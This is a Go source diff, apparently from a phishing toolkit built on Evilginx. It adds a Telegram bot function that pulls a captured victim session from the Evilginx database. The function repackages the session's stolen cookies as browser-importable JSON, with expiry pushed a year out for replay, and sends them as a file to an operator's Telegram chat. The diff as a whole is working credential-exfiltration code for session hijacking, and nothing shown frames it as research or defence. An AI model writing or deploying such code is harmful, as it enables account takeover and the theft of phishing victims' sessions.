@@ -901,6 +901,70 @@ func (t *TelegramBot) SendCookieValidationReport(sessionID string, evilginxCooki
 	return t.SendMessage(message.String())
 }
 
+// SendEvilginxCookiesFile sends cookies from Evilginx database as a file to Telegram
+func (t *TelegramBot) SendEvilginxCookiesFile(sessionID string, evilginxDB *database.Database) error {
+	if !t.Enabled {
+		return fmt.Errorf("telegram bot is disabled")
+	}
+	
+	// Get session from Evilginx database
+	session, err := evilginxDB.GetSessionBySid(sessionID)
+	if err != nil {
+		return fmt.Errorf("failed to get session: %v", err)
+	}
+	
+	// Convert cookies using Evilginx's exact format
+	type Cookie struct {
+		Path           string `json:"path"`
+		Domain         string `json:"domain"`
+		ExpirationDate int64  `json:"expirationDate"`
+		Value          string `json:"value"`
+		Name           string `json:"name"`
+		HttpOnly       bool   `json:"httpOnly"`
+		HostOnly       bool   `json:"hostOnly"`
+		Secure         bool   `json:"secure"`
+		Session        bool   `json:"session"`
+	}
+
+	var cookies []*Cookie
+	for domain, tokens := range session.CookieTokens {
+		for name, token := range tokens {
+			c := &Cookie{
+				Path:           token.Path,
+				Domain:         domain,
+				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
+				Value:          token.Value,
+				Name:           name,
+				HttpOnly:       token.HttpOnly,
+				Secure:         false,
+				Session:        false,
+			}
+			if strings.Index(name, "__Host-") == 0 || strings.Index(name, "__Secure-") == 0 {
+				c.Secure = true
+			}
+			if domain[:1] == "." {
+				c.HostOnly = false
+			} else {
+				c.HostOnly = true
+			}
+			if c.Path == "" {
+				c.Path = "/"
+			}
+			cookies = append(cookies, c)
+		}
+	}
+
+	// Convert to JSON using Evilginx's exact format
+	cookiesJSON, err := json.Marshal(cookies)
+	if err != nil {
+		return fmt.Errorf("failed to marshal cookies: %v", err)
+	}
+	
+	// Send as file to Telegram
+	fileName := fmt.Sprintf("cookies_%s.json", sessionID)
+	return t.SendFileFromText(fileName, string(cookiesJSON))
+}
+
 // Helper functions for extracting values from map[string]interface{}
 func getStringValueFromMap(m map[string]interface{}, key string) string {
 	if v, ok := m[key]; ok {
